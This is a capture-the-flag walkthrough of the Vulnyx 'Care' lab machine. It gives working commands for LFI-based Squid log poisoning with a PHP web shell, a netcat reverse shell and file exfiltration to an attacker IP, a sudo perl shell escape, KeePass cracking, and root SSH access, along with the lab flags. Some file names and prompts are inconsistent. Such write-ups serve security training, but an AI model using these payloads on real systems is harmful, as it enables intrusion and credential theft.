# Vulnyx: Care

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `curl` · `jq` · `nc` · `keepass2john` · `KDBXcrack` · `keepassxc` · `hydra` |
| **Tags** | `#LFI` `#LogPoisoning` `#RCE` `#SudoAbuse` `#KeePass` `#CredentialReuse` |
| **URL** | https://vulnyx.com/machines/ |

A Local File Inclusion vulnerability in `page.php` is chained with the Squid proxy running on the box: a request routed through Squid with a malicious User-Agent poisons its access log with PHP code, which the LFI then includes and executes — giving RCE and a reverse shell. From there, a sudo misconfiguration allows pivoting to `dorian`, and a KeePass database recovered from a hidden backup directory yields SSH credentials for `root` directly.

## Enumeration

### Port Scanning

A full TCP port scan is run first:

```bash
sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn care.nyx

PORT     STATE SERVICE     REASON
22/tcp   open  ssh         syn-ack ttl 64
80/tcp   open  http        syn-ack ttl 64
3128/tcp open  squid-http  syn-ack ttl 64
MAC Address: 08:00:27:95:F3:C9 (Oracle VirtualBox virtual NIC)
```

Three ports are found open: **22 (SSH)**, **80 (HTTP)**, and **3128**, the default port for the Squid proxy. A version/script scan against all three fills in the details:

```bash
sudo nmap -p 22,80,3128 -sCV care.nyx

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http       Apache httpd 2.4.62 ((Debian))
|_http-title: vCare Free Bootstrap Theme | webthemez
|_http-server-header: Apache/2.4.62 (Debian)
3128/tcp open  http-proxy Squid http proxy 5.7
|_http-server-header: squid/5.7
|_http-title: ERROR: The requested URL could not be retrieved
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
MAC Address: 08:00:27:95:F3:C9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A Squid proxy sitting alongside a web app is worth keeping in mind — proxy access logs are a common target for log poisoning when an LFI is also in play.

### Web Enumeration

The main page:

```
http://care.nyx
```
<img src="..\Images\care\Pasted image 20260717165048.png"/>

A content discovery scan turns up a page worth a closer look:

```bash
ffuf -u http://care.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt,.zip -ic

contact.html          [Status: 200, Size: 8480, Words: 773, Lines: 193, Duration: 4ms]
about.html            [Status: 200, Size: 13709, Words: 343, Lines: 5ms]
img                   [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 5ms]
services.html         [Status: 200, Size: 9629, Words: 1955, Lines: 228, Duration: 7ms]
page.php              [Status: 200, Size: 78, Words: 5, Lines: 1, Duration: 12ms]
.html                 [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 279ms]
.php                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 292ms]
index.html            [Status: 200, Size: 17525, Words: 3933, Lines: 376, Duration: 310ms]
index.html            [Status: 200, Size: 17525, Words: 3933, Lines: 376, Duration: 558ms]
css                   [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 0ms]
pricing.html          [Status: 200, Size: 8641, Words: 781, Lines: 244, Duration: 7ms]
portfolio.html        [Status: 200, Size: 10564, Words: 987, Lines: 257, Duration: 12ms]
js                    [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 3ms]
javascript             [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 11ms]
fonts                 [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 8ms]
.php                  [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 8ms]
.html                 [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 10ms]
server-status         [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 7ms]
:: Progress: [1102735/1102735] :: Job [1/1] :: 4081 req/sec :: Duration: [0:05:31] :: Errors: 0 ::
```

> **Endpoint:** `http://care.nyx/page.php?i=`

#### LFI Discovery

The `i` parameter looks like it's including a file. `ffuf` is used with a dedicated LFI wordlist to see which payloads produce a different response than the baseline:

```bash
ffuf -u 'http://care.nyx/page.php?i=FUZZ' -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 7

/etc/passwd            [Status: 200, Size: 1060, Words: 5, Lines: 23, Duration: 23ms]
:: Progress: [930/930] :: Job [1/1] :: 930/930] :: Job [1/1] :: 293 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Confirmed directly:

```
view-source:http://care.nyx/page.php?i=/etc/passwd
```
<img src="..\Images\care\Pasted image 20260717165107.png"/>

## Initial Access

### Remote Code Execution via Squid Log Poisoning

With arbitrary local file inclusion confirmed, the next question is which readable file can be turned into attacker-controlled PHP. Two log files are checked:

```
http://care.nyx/page.php?i=/var/log/apache2/access.log
```
<img src="..\Images\care\Pasted image 20260717165252.png"/>

```
http://care.nyx/page.php?i=/var/log/squid/access.log
```
<img src="..\Images\care\Pasted image 20260717165321.png"/>


The Squid access log is the one that gets used. A request is sent *through* the Squid proxy itself, with the User-Agent header set to a PHP web shell one-liner:

```bash
curl -sX GET --proxy "http://care.nyx:3128" "http://127.0.0.1:80" -A '<?php system($_GET["cmd"]); ?>'
```

Squid logs every proxied request, User-Agent included — so that PHP snippet now sits inside `/var/log/squid/access.log` as plain text. Including that log file through the LFI is enough to get it interpreted as PHP, since `include()` executes whatever valid PHP it finds regardless of the file's name or extension:

```bash
curl -sX GET "http://care.nyx/page.php?i=/var/log/squid/access.log&cmd=id" | tail -n 2
10.0.2.15 [17/Jul/2026:16:06:23 +0200] "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```

With arbitrary command execution confirmed, the same technique is used to trigger a reverse shell. The payload is URL-encoded first, since it needs to survive as a query string value:

```bash
echo -n 'busybox nc 10.0.2.15 9001 -e /bin/sh' | jq -sRr @uri
curl -sX GET "http://care.nyx/page.php?i=/var/log/squid/access.log&cmd=busybox%20nc%2010.0.2.15%209001%20-e%20%2Fbin%2Fsh"
```

A listener catches the callback:

```bash
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.44] 53438
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

## Lateral Movement

### Escalating to dorian

```bash
www-data@care:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@care:/var/www/html$ ls -l /home
total 4
drwx------ 3 dorian dorian 4096 Oct  2  2025 dorian
www-data@care:/var/www/html$ ls -l /home/dorian
ls: cannot open directory '/home/dorian/user.txt': Permission denied
www-data@care:/var/www/html$
```

`sudo -l` is checked next to see what the current user can run as someone else:

```bash
www-data@care:/var/www/html$ sudo -l
Matching Defaults entries for www-data on care:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on care:
    (dorian) NOPASSWD: /usr/bin/perl
```

The rule allows running `perl` as `dorian` without a password. Perl's `-e` flag executes an arbitrary snippet — spawning a shell through it inherits `dorian`'s privileges instead of perl exiting after running the one-liner:

```bash
www-data@care:/var/www/html$ sudo -u dorian /usr/bin/perl -e 'exec "/bin/sh";'
www-data@care:/var/www/html$ id
uid=1000(dorian) gid=1000(dorian) groups=1000(dorian)
```

```bash
dorian@care:/var/www/html$ id
uid=1000(dorian) gid=1000(dorian) groups=1000(dorian)
dorian@care:~$ ls -l /home/dorian
total 4
-r-------- 1 dorian dorian 33 Oct  2  2025 user.txt
dorian@care:~$ cat /home/dorian/user.txt
97c62ffbfe2e1c78d8048ae2a699619a
```

> **User flag:** `97c62ffbfe2e1c78d8048ae2a699619a`

### Loot: A Hidden KeePass Database

A hidden directory in `dorian`'s home folder holds a file whose extension doesn't match its actual contents:

```bash
dorian@care:~$ ls -la /home/dorian
total 28
drwx------ 3 dorian dorian 4096 Oct  2  2025 .
drwxr-xr-x 3 root   root   4096 Oct  2  2025 ..
drwxr-xr-x 2 dorian dorian 4096 Oct  2  2025 .bak
lrwxrwxrwx 1 dorian dorian    9 Nov 15  2023 .bash_history -> /dev/null
-rw-r--r-- 1 dorian dorian  220 Nov 15  2023 .bash_logout
-rw-r--r-- 1 dorian dorian 3526 Nov 15  2023 .bashrc
-rw-r--r-- 1 dorian dorian  807 Nov 15  2023 .profile
-r-------- 1 dorian dorian   33 Oct  2  2025 user.txt
dorian@care:~$ ls -l /home/dorian/.bak
total 4
-rw------- 1 dorian dorian 1941 Oct  2  2025 accede.txt
dorian@care:~$ file /home/dorian/.bak/data.txt
/home/dorian/.bak/data.txt: Keepass password database 2.x KDBX
```

`data.txt` is identified as a KeePass database. It's exfiltrated to the attacker box over a raw `nc` transfer — the attacker side listens and redirects the incoming stream to a file, the target side sends the file into a connection to that listener:

```bash
# Attacker machine
nc -lvp 9005 > data.txt

# Victim machine
nc 10.0.2.15 9005 < /home/dorian/.bak/data.txt
```

With the file renamed to its real extension, its password hash is extracted and cracked:

```bash
cp data.txt data.kdbx
keepass2john data.kdbx > data_hash
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/KDBXcrack/refs/heads/main/KDBXcrack" && chmod +x KDBXcrack
./KDBXcrack -f data.kdbx -w /usr/share/wordlists/rockyou.txt

╭╮╭━┳━━━┳━━╮╭━╮╭━╮           ╭╮  
┃┃┃╭┻╮╭╮┃╭╮┃╰╮╰╯╭╯           ┃┃  
┃╰╯╯ ┃┃┃┃╰╯╰╮╰╮╭╯ ╭━━┳━┳━━┳━━┫┃╭╮
┃╭╮┃ ┃┃┃┃╭━╮┃╭╯╰╮ ┃╭━┫╭┫╭╮┃╭━┫╰╯╯
┃┃┃╰┳╯╰╯┃╰━╯┣╯╭╮╰╮┃╰━┫┃┃╭╮┃╰━┫╭╮╮
╰╯╰━┻━━━┻━━━┻━╯╰━╯╰━━┻╯╰╯╰┻━━┻╯╰╯
─────────────────────────────────
 code: d4t4s3c   version: v1.0.0
─────────────────────────────────
[i] Cracking | db.kdbx
[i] Wordlist | /usr/share/wordlists/rockyou.txt
[*] Status   | 128/10000/1%/diamond
[+] Password | diamond
─────────────────────────────────
```

> **KeePass master password:** `diamond`

The database opens with that password and holds a set of SSH credentials:

```bash
keepassxc
```
<img src="..\Images\care\Pasted image 20260717162523.png"/>
<img src="..\Images\care\Pasted image 20260717162636.png"/>

> **Credentials:** `root:r00tB0$$123!`

## Privilege Escalation

### Shell as root

Rather than a local exploit, escalation here comes from valid credentials recovered from the vault. They're validated against SSH first:

```bash
hydra -l 'root' -p 'r00tB0$$123!' ssh://care.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://care.nyx:22
[22][ssh] host: care.nyx   login: root   password: r00tB0$$123!
1 of 1 test successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-17 10:27:13
```

They check out, and root is reached directly:

```bash
ssh root@care.nyx
root@care.nyx's password:
root@care:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@care:~# ls -l /root
total 4
-r-------- 1 root root 33 oct  2  2025 root.txt
root@care:~# cat /root/root.txt
3ba0b1d7e2e14ffd1f5b9788aa957bfd
```


> **Root flag:** `3ba0b1d7e2e14ffd1f5b9788aa957bfd`

## Takeaways

- Log poisoning turns any log file an LFI can reach into a potential RCE vector, as long as something attacker-controlled (a User-Agent, a referer, a request path) ends up written into it verbatim.
- A proxy sitting on the network isn't just a pivot point — its own logs are a file an LFI can target, even when the web server's own logs aren't accessible or don't log the right field.
- `sudo` rules built around a scripting language's interpreter (`perl`, `python`, `ruby`, etc.) are usually equivalent to full shell access as the target user, since almost all of them can spawn a shell with a one-liner.